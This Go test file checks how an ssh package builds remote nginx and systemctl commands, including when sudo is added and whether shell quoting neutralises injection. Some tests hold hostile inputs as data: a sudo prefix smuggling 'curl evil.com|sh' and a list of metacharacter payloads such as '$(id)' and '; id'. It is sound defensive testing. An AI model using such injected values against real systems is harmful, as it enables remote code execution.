package ssh

import (
	"os/exec"
	"strings"
	"testing"
)

func TestBuildCommand_NoSudoForBareNginxV(t *testing.T) {
	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-V"})
	want := "/usr/sbin/nginx -V"
	if got != want {
		t.Errorf("buildCommand(nginx -V) = %q, want %q", got, want)
	}
}

func TestBuildCommand_SudoForReload(t *testing.T) {
	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
	got := buildCommand(cfg, "/bin/systemctl", []string{"reload", "nginx.service"})
	want := "sudo -n /bin/systemctl reload nginx.service"
	if got != want {
		t.Errorf("buildCommand(systemctl reload) = %q, want %q", got, want)
	}
}

func TestBuildCommand_SudoForNginxT(t *testing.T) {
	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-t"})
	want := "sudo -n /usr/sbin/nginx -t"
	if got != want {
		t.Errorf("buildCommand(nginx -t) = %q, want %q", got, want)
	}
}

func TestBuildCommand_NoSudoForIsActive(t *testing.T) {
	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
	got := buildCommand(cfg, "/bin/systemctl", []string{"is-active", "nginx.service"})
	want := "/bin/systemctl is-active nginx.service"
	if got != want {
		t.Errorf("buildCommand(systemctl is-active) = %q, want %q", got, want)
	}
}

func TestBuildCommand_ShellEscape(t *testing.T) {
	cfg := Config{SystemctlPath: "/bin/systemctl"}
	got := buildCommand(cfg, "echo", []string{"hello world", "with'quote"})
	want := `echo 'hello world' 'with'\''quote'`
	if got != want {
		t.Errorf("buildCommand(escape) = %q, want %q", got, want)
	}
}

func TestBuildCommand_SudoPrefixInjectionIsQuoted(t *testing.T) {
	cfg := Config{SudoPrefix: "sudo -n; curl evil.com|sh; sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-t"})
	// Each whitespace-separated token must be individually quoted; metacharacters cannot escape.
	// Tokens: "sudo", "-n;", "curl", "evil.com|sh;", "sudo", "-n"
	// shellQuote leaves safe tokens bare and single-quotes tokens containing shell metacharacters.
	want := `sudo '-n;' curl 'evil.com|sh;' sudo -n /usr/sbin/nginx -t`
	if got != want {
		t.Errorf("buildCommand(injection) =\n  %q\nwant\n  %q", got, want)
	}
}

// CodeQL flags buildCommand as a command-injection sink because the string
// reaches a remote shell. shellQuote is the sanitizer, so prove it by running
// the result through a real shell and checking the argument survives intact.
func TestBuildCommandNeutralisesShellMetacharacters(t *testing.T) {
	for _, payload := range []string{
		"/etc/nginx/nginx.conf; id",
		"$(id)",
		"`id`",
		"a'b",
		"x\"y",
		"| id",
		"&& id",
		"$IFS",
	} {
		t.Run(payload, func(t *testing.T) {
			// echo is a stand-in for the remote command; what matters is that
			// the shell receives the payload as one literal argument.
			cmd := buildCommand(Config{}, "echo", []string{payload})

			out, err := exec.Command("/bin/sh", "-c", cmd).Output()
			if err != nil {
				t.Fatalf("running %q: %v", cmd, err)
			}
			if got := strings.TrimRight(string(out), "\n"); got != payload {
				t.Fatalf("payload was interpreted by the shell.\n  command: %s\n  want: %q\n  got:  %q",
					cmd, payload, got)
			}
		})
	}
}
